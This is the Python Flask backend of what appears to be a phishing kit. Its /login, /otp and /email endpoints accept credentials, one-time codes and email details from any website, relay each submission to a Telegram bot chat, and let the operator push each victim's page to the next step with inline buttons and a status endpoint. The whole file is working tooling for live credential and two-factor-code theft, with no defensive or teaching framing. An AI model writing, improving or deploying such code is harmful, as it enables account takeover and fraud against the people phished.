from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import json
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

@app.after_request
def handle_options(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

# 🔥 SIMPLE SESSION SYSTEM
SESSION_STATUS = {}

# ======================
# TELEGRAM SEND
# ======================
def send_to_telegram(data, session_id, type_):
    msg = f"🔐 {type_.upper()} Submission\n\n"
    for k, v in data.items():
        msg += f"• {k.upper()} : {v}\n"
    msg += f"\nSESSION: {session_id}"

    keyboard = {
        "inline_keyboard": [
            [{"text": "🔐 LOGIN", "callback_data": f"{session_id}:login"}],
            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email"}],
            [{"text": "🎉 DONE", "callback_data": f"{session_id}:approved"}]
        ]
    }

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "reply_markup": json.dumps(keyboard)
    }

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data=payload
    )

# ======================
# LOGIN (🔥 NO FAIL ANYMORE)
# ======================
@app.route("/login", methods=["POST", "OPTIONS"])
def login():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json() or {}

    print("🔥 LOGIN RECEIVED:", data)

    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = "pending"

    send_to_telegram(data, session_id, "login")

    return jsonify({
        "success": True,
        "id": session_id
    })

# ======================
# OTP
# ======================
@app.route("/otp", methods=["POST", "OPTIONS"])
def otp():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json() or {}

    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = "pending"

    send_to_telegram(data, session_id, "otp")

    return jsonify({
        "success": True,
        "id": session_id
    })

# ======================
# EMAIL
# ======================
@app.route("/email", methods=["POST", "OPTIONS"])
def email():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json() or {}

    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = "pending"

    send_to_telegram(data, session_id, "email")

    return jsonify({
        "success": True,
        "id": session_id
    })

# ======================
# STATUS (🔥 FIXED)
# ======================
@app.route("/status/<session_id>")
def status(session_id):
    status = SESSION_STATUS.get(session_id)

    if not status:
        return jsonify({"status": "invalid"}), 404

    return jsonify({
        "status": status
    })

# ======================
# TELEGRAM WEBHOOK (🔥 KEY PART)
# ======================
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()

    if "callback_query" in data:
        callback = data["callback_query"]
        message = callback["data"]

        try:
            session_id, action = message.split(":")

            if session_id in SESSION_STATUS:
                SESSION_STATUS[session_id] = action
                print(f"✅ SESSION {session_id} → {action}")

        except Exception as e:
            print("Webhook error:", e)

    return jsonify({"ok": True})

# ======================
# ROOT
# ======================
@app.route("/")
def home():
    return "✅ Server running"

# ======================
# RUN
# ======================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
